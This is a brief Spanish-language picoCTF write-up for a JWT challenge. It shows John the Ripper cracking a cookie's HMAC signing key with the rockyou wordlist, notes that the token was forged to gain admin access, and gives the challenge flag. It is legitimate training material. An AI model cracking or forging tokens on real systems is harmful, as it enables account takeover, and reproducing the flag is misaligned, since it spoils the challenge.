## Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864

Hints
 - What is that cookie?
 - Have you heard of JWT?
## Solucion
Instalar wordlists
```
sudo apt install wordlists
```
Instalar la libreria john ripper.
```bash
sudp apt install john
```
Copiamos la cookie en un archivo y realizamos lo siguiente
```bash

┌──(wil㉿DESKTOP-FKOIV4I)-[/tmp/tmp.mAoYea2Ss4]
└─$ nano cookie

┌──(wil㉿DESKTOP-FKOIV4I)-[/tmp/tmp.mAoYea2Ss4]
└─$ john cookie -w=/usr/share/wordlists/rockyou.txt
Created directory: /home/wil/.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:07 DONE (2024-09-24 21:22) 0.1262g/s 934012p/s 934012c/s 934012C/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(wil㉿DESKTOP-FKOIV4I)-[/tmp/tmp.mAoYea2Ss4]
└─$
```

Modificamos el payload y la llave para obtener la bandera.
picoCTF{jawt_was_just_what_you_thought_1ca14548}
## Notas adicionales
## Referencias
- [JSON Web Token - Wikipedia, la enciclopedia libre](https://es.wikipedia.org/wiki/JSON_Web_Token)
- 